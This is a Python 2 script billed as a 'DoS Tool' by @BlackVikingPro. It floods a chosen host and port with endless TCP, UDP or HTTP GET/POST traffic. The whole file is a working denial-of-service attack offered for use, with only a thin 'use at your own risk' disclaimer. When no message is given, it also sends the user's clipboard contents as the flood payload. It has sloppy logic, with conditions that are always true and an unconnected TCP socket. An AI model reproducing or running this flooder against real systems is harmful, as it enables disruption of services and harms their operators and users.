#! /usr/bin/env python
# -*- coding: utf-8 -*-
""" Python DAB ~ DoS Tool ~ By Wįłłý Fœx : @BlackVikingPro """

"""
 Python D.A.B. [ |)3|\|`/ 411 |31T(|-|3z ] ~ DoS Tool ~ By Wįłłý Fœx : @BlackVikingPro
 Use at your own risk. I do/will not condone any illegal activity
 I'm not responsible for your actions.

 Usage and Syntax:

 Syntax: ./dab.py -s <target> -p <port> -t <type>

 Usage | Options:
  -s [--server]		- Target server's ip/hostname
  -p [--port]			- Port to flood with packets
  -t [--type]			- Type of attack [udp, tcp, http]
  -m [--message]		- Custom tcp/udp/http message to send

 Example: ./dab.py --server loop.blackvikingpro.xyz --port 80 --type tcp --message getrekt
"""
import os, sys, socket, time, requests, signal, platform, requests
try:
	from Tkinter import Tk
	pass
except ImportError:
	if os.geteuid() == 0:
		_opt = raw_input("Tkinter is required. Should we install it? Y/n ")
		if _opt in ('y', 'Y'):
			os.system('apt-get install python-tk')
			os.system('clear')
		else:
			print ( "Please install 'python-tk' using: 'apt-get install python-tk'" )
			sys.exit()
	else:
		sys.exit("Please install 'python-tk' using: 'apt-get install python-tk'")
		pass
	pass

"""
try:
	from django.core.validators import URLValidator
	from django.core.exceptions import ValidationError
	pass
except ImportError:
	if os.geteuid() == 0:
		_opt = raw_input("Django is required. Should we install it? Y/n ")
		if _opt in ('y', 'Y'):
			os.system('pip install django')
			os.system('clear')
		else:
			print ( "Please install 'django' using: 'pip install django'")
			sys.exit()
	else:
		sys.exit("Please install 'django' using: 'pip install django'")
		pass
	pass
"""

verbose = False # display verbose-level information

def usage():
	print ""
	print ( " Python D.A.B. \033[93m[ |)3|\|`/ 411 |31T(|-|3z ]\033[0m ~ DoS Tool ~ By " + str("Wįłłý Fœx") + " : @BlackVikingPro" )
	print ( " Use at your \033[91mown\033[0m risk. I do/will not condone any \033[91millegal\033[0m activity\n I'm not responsible for your actions.\n" )
	print ( " Usage and Syntax:\n" )
	if sys.argv[0].startswith('./'):
		print ( " Syntax: %s -s <target> -p <port> -t <type>" % sys.argv[0] )
		pass
	else:
		print ( " Syntax: ./%s -s <target> -p <port> -t <type>" % sys.argv[0] )
		pass
	print ( "\n Usage | Options:" )
	print ( "  -s [--server]		- Target server's ip/hostname" )
	print ( "  -p [--port]			- Port to flood with packets" )
	print ( "  -t [--type]			- Type of attack [udp, tcp, http]" )
	print ( " 						-- if 'http' was chosen, define either: '--get' or '--post' for the request method." )
	print ( "  -m [--message]		- Custom tcp/udp/http message to send")
	if sys.argv[0].startswith('./'):
		print ( "\n Example: %s --server loop.blackvikingpro.xyz --port 80 --type tcp --message getrekt" % sys.argv[0] )
	else:
		print ( "\n Example: ./%s --server loop.blackvikingpro.xyz --port 80 --type tcp --message getrekt" % sys.argv[0] )
		pass
	print ""
	pass

def error(message):
	print ( "\n \033[93m[*] \033[91m%s\033[0m\n" % message )
	pass

def warn(message):
	print ( "\n\033[95m [*] \033[93m%s\033[0m\n " % message )
	pass

def signal_handler(signal, frame):
	print ""
	error( "Exiting cleanly..." )
	sys.exit()
	pass
signal.signal(signal.SIGINT, signal_handler)

if platform.system() == 'Windows':
	warn("This script has not yet been tested on a Windows machine.\nTry it for me and open a new fork on GitHub! (shoutouts will be given)")
elif platform.system() == 'Linux':
	_continue = True
	pass

if len(sys.argv) == 1:
	usage()
	sys.exit()
	pass

help_args = ['help', '-h', 'h', '--help', '/?', '?']
try:
	if sys.argv[1] in help_args:
		usage()
		sys.exit()
		pass
	pass
except IndexError:
	pass

try:
	# server = (str(sys.argv[1]), int(sys.argv[2]))
	if '-s' in sys.argv:
		s_option_pos = sys.argv.index('-s')
		target = sys.argv[(s_option_pos + 1)]
	elif '--server' in sys.argv:
		s_option_pos = sys.argv.index('--server')
		target = sys.argv[(s_option_pos + 1)]
	else:
		error("Error: Server not defined.")
		usage()
		sys.exit()
		pass

	if '-p' in sys.argv:
		p_option_pos = sys.argv.index('-p')
		port = sys.argv[(p_option_pos + 1)]
	elif '--port' in sys.argv:
		p_option_pos = sys.argv.index('--port')
		port = sys.argv[(p_option_pos + 1)]
	else:
		error("Error: Port not defined.")
		usage()
		sys.exit()
		pass
	
	if '-t' in sys.argv:
		t_option_pos = sys.argv.index('-t')
		_type = sys.argv[(t_option_pos + 1)]
	elif '--type' in sys.argv:
		t_option_pos = sys.argv.index('--type')
		_type = sys.argv[(t_option_pos + 1)]
	else:
		error("Error: Type not defined.")
		usage()
		sys.exit()
		pass

	if ('--get' or '--GET') in sys.argv:
		_rtype = 'get'
		pass
	elif ('--post' or '--POST') in sys.argv:
		_rtype = 'post'
		pass
	else:
		if _type in ('http', 'HTTP'):
			warn("HTTP Request method not chosen. Using 'get'")
			_rtype = 'get' # for default
			pass
		_rtype = 'get' # defining the http type is not required.
		pass

	if '-m' in sys.argv:
		m_option_pos = sys.argv.index('-m')
		message = sys.argv[(m_option_pos + 1)]
	elif '--message' in sys.argv:
		m_option_pos = sys.argv.index('--message')
		message = sys.argv[(m_option_pos + 1)]
	else:
		try:
			message = open('data.txt', 'r').read()
		except IOError:
			file = open('data.txt', 'w') # open file in write mode
			# file.write('henlo, i am your master') # write data to file
			file.write(Tk().clipboard_get())
			file.close() # close file handle

			message = open('data.txt', 'r').read()
		pass

	if ('-v' or '--verbose') in sys.argv:
		print "Verbose enabled."
		verbose = True
	elif '-v' or '--verbose' not in sys.argv:
		verbose = False
		pass

	pass
except IndexError:
	usage()
	sys.exit()
except ValueError as v:
	if '-s' or '--server' not in sys.argv:
		error("Error: Server not defined.")
		usage()
		sys.exit()
	elif '-p' or '--port' not in sys.argv:
		error("Error: Port not defined.")
		usage()
		sys.exit()
	elif '-t' or '--type' not in sys.argv:
		error("Error: Type not defined.")
		usage()
		sys.exit()
		pass
	pass


# if client got this far, then we're in business
server = (str(target), int(port))
attack_type = str(_type)

methods = [ 'udp', 'tcp', 'http',
			'UDP', 'TCP', 'HTTP', ]
# print ( "You've chosen to attack: %s:%s :with method: %s!" % (server[0], server[1], attack_type) )

# now we must check input
if int(port) > 65535:
	error("Port cannot be above '65535'.")
	sys.exit()
	pass
if attack_type not in methods:
	error("Invalid attack type. '%s' is not valid. Please choose either [ udp, tcp, http ]." % attack_type)
	sys.exit()
	pass



# define some functions for the actual DoS attack

def sendpacket(_type, sock, data, server='', port=''):
	if _type in ('tcp', 'TCP'):
		try:
			sock.send(b'%s' % data.encode())
			pass
		except socket.error as e:
			print ""
			error( "%s <!-- Server may be down -->" % e )
			sock.close()
			sys.exit()
		pass
	elif _type in ('udp', 'UDP'):
		try:
			sock.sendto(b'%s' % data, (server, port))
			# sock.sendto(bytes(data, "utf-8"), (server))
			# sock.sendto(b'%s' % data, (server))
			pass
		except socket.error as e:
			print ""
			error( "%s <!-- Server may be down -->" % e )
			sock.close() # clean close
			sys.exit()
		pass
	pass


def dos_tcp(server, attack_type, message):
	warn ( "You've chosen to attack: \033[96m%s\033[93m at port \033[96m%s\033[93m using attack method: \033[96m%s\033[93m." % (server[0], server[1], attack_type) )
	
	warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server[0], server[1]) )

	try:
		if _type == 'tcp' or 'TCP':
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # define a tcp socket
				# sock.connect((server))
			except socket.error as e:
				# error( e )
				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server[0], server[1]))
				sock.close()
				sys.exit()
			pass
		
		x = 0
		while True:
			sendpacket(attack_type, sock, message)

			nums = []
			nums.append(x + 1)
			_range = ['_']

			for _ in _range:
				for x in nums:
					sys.stdout.write( " \r Packet [ %s ] sent! " % x )
					sys.stdout.flush()
					# time.sleep(.1)
				pass

			pass
		pass
	except KeyboardInterrupt:
		print ""
		error( "Exiting cleanly..." )
		sock.close()
		sys.exit()
	except socket.error as e:
		error( "%s seems to be down or doesn't accept data on port %s. Try a different port?" % (server) )
		error( e )
		sock.close()
		sys.exit()
	pass

def dos_udp(server, attack_type, message):
	warn ( "You've chosen to attack: \033[96m%s\033[93m at port \033[96m%s\033[93m using attack method: \033[96m%s\033[93m." % (server[0], server[1], attack_type) )
	
	warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server[0], server[1]) )

	try:
		if _type == 'udp' or 'UDP':
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # define a udp socket
				sock.connect((server))
			except socket.error as e:
				# error( e )
				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server[0], server[1]))
				sock.close()
				sys.exit()
			pass
		
		x = 0
		while True:
			sendpacket(attack_type, sock, message, server[0], server[1])

			nums = []
			nums.append(x + 1)
			_range = ['_']

			for _ in _range:
				for x in nums:
					sys.stdout.write( " \r Packet [ %s ] sent! " % x )
					sys.stdout.flush()
					# time.sleep(.1)
				pass

			pass
		pass
	except KeyboardInterrupt:
		print ""
		error( "Exiting cleanly..." )
		sock.close()
		sys.exit()
	except socket.error as e:
		error( "%s seems to be down or doesn't accept data on port %s. Try a different port?" % (server) )
		error( e )
		sock.close()
		sys.exit()
	pass

def flood_http(server, _type, message):

	warn ( "You've chosen to attack: \033[96m%s\033[93m using attack method: \033[96m%s\033[93m -- \033[96m%s\033[93m." % (server[0], attack_type, _type) )
	
	warn ( "Attacking \033[96m%s\033[93m now!" % server[0] )


	if (server[0].startswith('http://') or server[0].startswith('https://')):
		_continue = True # we're good here
	else:
		server = list(server)
		server[0] = "http://" + server[0]
		pass

	x = 0
	while True:

		if _type in ('get', 'GET'):
			conn = requests.get(server[0])
			pass
		elif _type in ('post', 'POST'):
			conn = requests.post(server[0])
			pass
		
		
		nums = []
		nums.append(x + 1)
		_range = ['_']

		for _ in _range:
			for x in nums:
				sys.stdout.write( " \r Request [ %s ] sent! " % x )
				sys.stdout.flush()
				# time.sleep(.1)
			pass

		conn.close() # close connection so we can re-open it later

		pass
pass


if __name__ == '__main__':
	# things must've checked out by now
	if _type in ('tcp', 'TCP'):
		dos_tcp(server, _type, message)
	elif _type in ('udp', 'UDP'):
		dos_udp(server, _type, message)
	elif _type in ('http', 'HTTP'):
		flood_http(server, _rtype, message)
		pass
	pass